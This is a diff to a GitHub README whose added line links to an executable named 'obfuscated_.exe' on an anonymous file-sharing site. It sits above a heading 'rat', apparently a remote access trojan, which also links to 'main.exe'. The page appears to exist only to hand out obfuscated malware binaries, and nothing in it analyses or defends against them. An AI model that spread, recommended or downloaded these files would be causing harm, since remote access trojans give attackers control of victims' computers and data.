@@ -7,6 +7,9 @@
 ![Image Preview](https://img.shields.io/github/issues/hai723/storage?color=blue&logocolor=blue&style=flat-square)
 ![Image Preview](https://img.shields.io/github/issues-closed/hai723/storage?color=blue&logoColor=%23da467d&style=flat-square)
 
+
+https://anonsharing.com/file/8639de1608c9837f/obfuscated_.exe
+
 # rat
 
 https://anonsharing.com/file/30b2d157c4b63190/main.exe
